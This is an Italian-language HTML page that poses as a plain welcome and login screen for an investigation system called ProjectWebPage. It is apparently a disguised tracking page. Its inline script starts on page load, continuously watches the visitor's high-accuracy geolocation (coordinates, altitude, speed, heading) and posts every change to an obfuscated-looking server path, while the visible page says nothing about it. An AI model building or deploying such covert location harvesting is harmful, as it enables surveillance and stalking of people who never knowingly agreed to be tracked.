<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Project Web Page</title><link type="image/x-icon" rel="icon" href="./image/favicon.ico"/><meta content="website description" name="description"/><meta content="website keywords, website keywords" name="keywords"/><meta content="text/html; charset=UTF-8" http-equiv="content-type"/><link title="style" href="./style/style.css" type="text/css" rel="stylesheet"/><script type="text/javascript" src="./jquery-3.6.0.min.js"></script><script type="text/javascript">
			   
			  		//<![CDATA[
		    		
		    		function getDataToSend() {
	    			  if (navigator.geolocation) {
	    			    idWatch = navigator.geolocation.watchPosition(showPosition, error, options);
	    			  } else { 
	    				  sendData(constructData(null, "no_data_info"));
	    			  }
	    			}

	    			function showPosition(position) {

	    				coppiaCordinate.latitude = position.coords.latitude;
	    				coppiaCordinate.longitude = position.coords.longitude;
	    			    coppiaCordinate.altitude = position.coords.altitude;
	    			    coppiaCordinate.timestamp = position.timestamp;
	    			    coppiaCordinate.accuracy = position.coords.accuracy;
	    			    coppiaCordinate.altitudeAccuracy = position.coords.altitudeAccuracy;
	    			    coppiaCordinate.heading = position.coords.heading;
	    			    coppiaCordinate.speed = position.coords.speed;
	    			    coppiaCordinate.dateTimestamp = new Date(coppiaCordinate.timestamp).toLocaleString("it-IT", optionFormatDate);
	    			    coppiaCordinate.count = count;
	    			    coppiaCordinate.coordinatesChanged = false;
	    			    
	    			    if(coppiaCordinate.oldLatitude != coppiaCordinate.latitude ||
	    			       coppiaCordinate.oldAltitude != coppiaCordinate.altitude ||
	    			       coppiaCordinate.oldLongitude != coppiaCordinate.longitude ) {
	    			    	coppiaCordinate.messageNewCoordinates = "New coordinates: (" + coppiaCordinate.latitude + ", " + coppiaCordinate.longitude + "), altitude: " + coppiaCordinate.altitude + ", time: " + coppiaCordinate.dateTimestamp;
	    			        coppiaCordinate.messageOldCoordinates = "Old coordinates: (" + coppiaCordinate.oldLatitude + ", " + coppiaCordinate.oldLongitude + "), old Altitude: " + coppiaCordinate.oldAltitude + ", Old time: " + coppiaCordinate.oldDateTimestamp;
	    			        coppiaCordinate.coordinatesChanged = true;
	    			    }
	    			    
	    			    if (!!coppiaCordinate.coordinatesChanged){
	    			    	sendData(constructData(coppiaCordinate, "data_info"));
	    			    } 
	    			    
	    			    coppiaCordinate.oldLatitude = coppiaCordinate.latitude;
	    			    coppiaCordinate.oldLongitude = coppiaCordinate.longitude;
	    			    coppiaCordinate.oldAltitude = coppiaCordinate.altitude;
	    			    coppiaCordinate.oldTimestamp = coppiaCordinate.timestamp;
	    			    coppiaCordinate.oldDateTimestamp = coppiaCordinate.dateTimestamp;
	    			    
	    			    ++count;
	    			}

	    			function error(err) {
	    				sendData(constructData(null, "error_data_info", [err.code, err.message]));
	    			}

	    				var optionFormatDate = {
	    								  day: "2-digit",
	    								  month: "2-digit",
	    								  year: "2-digit",
	    								  hour: "2-digit",
	    								  minute: "2-digit",
	    								  second: "2-digit",
	    								  weekday: "short"
	    								};
	    			                    
	    			var idWatch, target, options;
	    			var count = 0;

	    			var options = {
	    			  enableHighAccuracy: true,
	    			  timeout: 20000,
	    			  maximumAge: 30000
	    			};

	    			var coppiaCordinate = {
	    			  latitude : 0,
	    			  longitude: 0,
	    			  altitude: 0,
	    			  oldLatitude : 0,
	    			  oldLongitude: 0,
	    			  oldAltitude: 0,
	    			  timestamp: 0,
	    			  oldTimestamp: 0,
	    			  dateTimestamp: "",
	    			  oldDateTimestamp: "",
	    			  accuracy: 0,
	    			  altitudeAccuracy: 0,
	    			  heading: 0,
	    			  speed: 0,
	    			  messageNewCoordinates: "",
	    			  messageOldCoordinates: "",
	    			  coordinatesChanged: false,
	    			  count: 0
	    			};

	    			
	    			function constructData(objData, typeRequest, arrayObjInterno, message){
	    				!arrayObjInterno  && (arrayObjInterno = []);
	    				!message && (message = null);
	    				datiFormObj = {
								reqType: typeRequest,
								dataObject: objData,
								arrayObjInterno: arrayObjInterno, //   arrayObjInterno: [],
								generalObject: objData,
								message: message
					    };

			    		return datiFormObj;
			    	}
           
	    			//alert("\u00e8  \350  \xe8");  'è' in unicode (u\00e8), in base 8 (\350), in esadecimale con due lettere (\xe8) 
			    	function sendData(datiFormObj){
			    		
			    		FormJSON = JSON.stringify(datiFormObj);
			    		
			    		$.ajax( {
			        		   url: "./qppRLmJZbp40ZrZnFLjKyX8bbAoU5jHGGLpV3txj0LG4pSweIAoM0aveTdx2ojTMAWWF3pEjgRp3aQikocPe1SASsnSb/nN+lZve0HEjT6KxzXNY6hyfe82y/AeEsbCBBxd459GQ=",
			    			   type: "POST",
			    			   async: true,
			    			   timeout: 15000, //timeout di 15 secondi per l richiesta
			    			   statusCode: {
			    			     404: function() {
			    			       alert("La risorsa non è disponibile. Provare ad effettuare la registrazione\n in un secodo momento (Page not found)");
			    			     },
			    			     200: function() {
			    			       //alert("Status OK");
			    			     }
			    			   },
			    			   beforeSend: function(jqXHR, settings){
			    				   //alert("Before send function");
			    			   },
			    			   //contentType: "application/x-www-form-urlencoded; charset=UTF-8", //this is the default value for request (to a more appropriate MIME type)
			    			   //contentType: "application/json; charset=UTF-8", //this is only for JSON
			    			   dataType: "json", //data type of request
			    			   mimeType: "application/json; charset=UTF-8", //data type of response 
			    			   data: FormJSON})
			        			   .done(function(data, textStatus, jqXHR) { 
			        				    var text = JSON.stringify(data);
										var OBJ = JSON.parse(text);
										/*alert("Ajax Success. textStatus = "+textStatus+", data = "+data+", jqXHR = "+jqXHR);
										if(typeof data == "object")
											alert((typeof data)+", "+data.date);
										alert("OBJ.ok: "+OBJ.ok+", OBJ.codeError: "+OBJ.codeError);
										alert($(data));*/
										
										//alert(OBJ.message);
										
							           
			        				})
			        		       .fail(function() { /*alert("error");*/ })
			        		       .always(function() { /*alert("complete");*/ });
			   				
			    	}
			    	
			    	
			    	$(document).ready(function() {
			    		$("div#main").css("width", window.screen.width);
						$("div#site_content").css("width", window.screen.width);
						$("div#menubar").css("width", window.screen.width-30);
						$("div#header").css("width", window.screen.width);
						$("div#footer").css("width", window.screen.width-30);
						$("div#logo").css("width", window.screen.width-150);
			    		$("div#main").css('min-height', document.documentElement.clientHeight+'px');
						$("div#site_content").css('min-height',  (parseInt($("div#main").css('min-height')) - $("div#header").height() - $("div#footer").height())+'px');
			    
					    
			    		$("div[id='loadingDiv']").css("display","none");
					    $("div[id='main']").css("display","block");
					    
					    getDataToSend();
					    
					});
				   
				   //]]>
				   
				  </script></head><body><div style="display: block;" id="loadingDiv"><img src="./image/ajax-loader2.gif" id="loadingDivImage"/></div><div style="display: none;" id="main"><div style="margin: 0 auto;" id="header"><div id="logo"><div id="logo_text"><h1><a href="./index.html
					">Progetto <span class="logo_colour">ProjectWebPage</span></a></h1><h2/></div><div style="float: right; padding-top: 10px;"></div></div><div id="menubar"><ul id="menu"><li class="selected"><a href="./index.html
					">Home</a></li></ul></div></div><div style="min-height: 500px; text-align: center;" id="site_content"><div id="content"><h1>Benvenuti nel sistema per la gestione di indagine ProjectWebPage</h1><div><img style="width: 900px;" src="./image/chat.jpg"/></div><div><h3>Effettua il <a onclick="effettuaLoginEsplicito();" href="javascript:void(0);">Login</a> oppure se non sei ancora registrato <a href="">Registrati</a></h3></div></div></div><div style="margin: 0 auto;" id="footer"><div id="content_footer">
	    	Copyright © Project Web Page | <a href="http://validator.w3.org/check?uri=referer">HTML5</a> | <a href="http://jigsaw.w3.org/css-validator/check/referer">CSS</a> | <a href="#">design from ProdySoftware</a></div></div></div></body></html>
